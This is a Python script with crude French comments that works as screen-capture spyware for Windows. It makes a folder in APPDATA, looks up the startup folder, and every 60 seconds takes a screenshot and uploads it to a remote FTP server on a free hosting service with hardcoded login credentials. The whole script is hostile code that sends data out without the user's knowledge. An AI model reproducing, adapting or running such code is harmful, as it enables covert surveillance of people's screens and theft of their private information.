import os
import datetime
import pyautogui
import time
import ftplib
from pathlib import Path
import winshell

#détecter le path du dossier appdata sur la machine
appdata = os.getenv('APPDATA')
#détecter le path du dossier startup sur la machine (ne fonctionnait simplement pas avec la lib os je peux aussi simplement récupérer le nom de l'utilisateur et l'ajouter dans le path mais bref)
startup = winshell.startup()


#créer un dossier jul dans le appdata de la machine
dirName = f'{appdata}/jul'
try:
    os.makedirs(dirName)
except FileExistsError:
    print("pd")

def jul():
    while True:
        #récupérer la date + l'heure actuelle
        screenmtn = datetime.datetime.now()
        #placer la date et l'heure sous une forme de vrai date sa mère
        date = screenmtn.strftime("%m-%d-%Y %H-%M-%S")
        
        #prendre un screenshoot sur la machine
        screen = pyautogui.screenshot()
        #save le screenshoot dans le dossier
        screen.save(rf'{appdata}\jul\%s.png' % date)
        
        #path de l'image
        jul = Path(rf'{appdata}\jul\%s.png' % date)
        
        #Connexion ftp blablabla upload du fichier
        session = ftplib.FTP('files.000webhost.com','loutchocsgo','allahwakbar')
        
        file = open(jul,'rb')
        session.storbinary(f'STOR {jul.name}', file)
        file.close()
        session.quit()
        #attendre 60 secondes avant de répeter la tache ducoup
        time.sleep(60)

jul()
